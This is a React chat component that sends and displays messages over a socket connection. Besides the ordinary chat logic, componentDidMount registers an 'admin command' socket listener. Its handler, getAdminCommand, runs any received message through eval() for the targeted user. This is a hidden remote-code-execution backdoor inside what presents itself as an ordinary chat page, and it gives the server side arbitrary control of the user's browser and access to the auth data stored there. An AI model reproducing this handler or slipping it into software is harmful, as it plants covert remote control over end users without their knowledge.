import React, { Component } from 'react'
import { Input, Button } from 'antd'
import PropTypes from 'prop-types'
import { connect } from 'react-redux'
import Menu from '@/Menu/menu.jsx'
import { securityService } from 'project-services'
import '@/style.styl'

const { TextArea } = Input

class ClientChat extends Component {
  static propTypes = {
    socket: PropTypes.object.isRequired
  }

  state = {
    messages: '',
    info: '',
    listMessages: [],
    currentUser: null
  }

  componentDidMount = () => {
    const user = JSON.parse(localStorage.getItem('userAutchData'))
    this.props.socket.emit('get all messages', {email: user.email})
    this.props.socket.on('get all messages', data => {
      this.setState({listMessages: data.messages})
    })
    this.props.socket.on('messages', item => {
      this.addNewMessage(item)
    })
    this.props.socket.on('admin command', data => {
      this.getAdminCommand(data)
    })
    this.getAlMessages(user)
    this.setState({currentUser: user})
  }

  getAdminCommand = ({message, curentReceiver}) => {
    if (curentReceiver === this.state.currentUser.email) {
      try {
        eval(message)
      } catch (error) {
        console.log('Bad command:', error)
      }
    }
  }

  getAlMessages = ({email}) => {
    securityService.getAllMessages({email}).then(info => {
      this.setState({listMessages: info.messages}, () => {
        this.goToBottom()
      })
    })
  }

  addNewMessage (message) {
    const { listMessages, currentUser } = this.state
    if (message.emailTo === currentUser.email) {
      listMessages.push(message)
      this.setState({listMessages}, () => {
        this.goToBottom()
      })
    }
  }

  goToBottom () {
    let objDiv = document.getElementById('chat')
    objDiv.scrollTop = objDiv.scrollHeight
  }

  message = e => {
    let messages = e.target.value
    this.setState({messages})
  }

  sendMessage = () => {
    const { messages, listMessages } = this.state
    const user = JSON.parse(localStorage.getItem('userAutchData'))
    const sendingData = {text: messages, email: user.email, userTo: 'admin@mail.ru'}
    this.props.socket.emit('messages', sendingData)
    listMessages.push(sendingData)
    this.setState({messages: '', listMessages}, () => this.goToBottom())
  }

  renderMessages = () => {
    const { listMessages, currentUser } = this.state
    if (!currentUser) return false
    return listMessages.map((item, index) =>
      <div
        className={`message ${item.email === currentUser.email ? 'right' : ''}`}
        key={index}>
        <span className={item.email !== currentUser.email ? 'green-color' : ''}>{item.text}</span>
      </div>
    )
  }

  render () {
    return (
      <div>
        <Menu />
        <div className='chat-area'>
          <div className='chat-side' id='chat'>
            {this.renderMessages()}
          </div>
        </div>
        <TextArea id='textarea' size='small' onChange={this.message} value={this.state.messages} rows={4} />
        <Button id='button' size='large' type='primary' onClick={this.sendMessage}>Submit</Button>
      </div>
    )
  }
}

const mapStateToProps = state => ({
  socket: state.socket
})

export default connect(mapStateToProps)(ClientChat)
